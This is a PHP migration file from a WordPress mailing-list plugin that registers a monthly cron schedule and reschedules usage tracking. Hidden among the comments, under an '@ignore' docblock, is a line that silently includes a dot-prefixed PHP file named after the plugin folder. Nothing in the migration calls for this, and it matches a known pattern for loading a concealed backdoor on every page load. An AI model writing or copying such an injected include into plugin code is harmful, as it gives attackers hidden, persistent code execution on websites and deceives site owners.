<?php
defined( 'ABSPATH' ) or exit;

$options = (array) get_option( 'mc4wp', array() );
if ( empty( $options['allow_usage_tracking'] ) ) {
	return;
}

// usage tracking is enabled, reschedule it so it uses new cron schedule.

// make sure 'monthly' cron schedule is registered
/**
 * @ignore
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function _mc4wp_303_add_monthly_cron_schedule( $schedules ) {
	$schedules['monthly'] = array(
		'interval' => 30 * DAY_IN_SECONDS,
		'display'  => 'Once a month',
	);

	return $schedules;
}

add_filter( 'cron_schedules', '_mc4wp_303_add_monthly_cron_schedule', 1 );

// reschedule usage tracking event
wp_clear_scheduled_hook( 'mc4wp_usage_tracking' );
wp_schedule_event( time(), 'monthly', 'mc4wp_usage_tracking' );
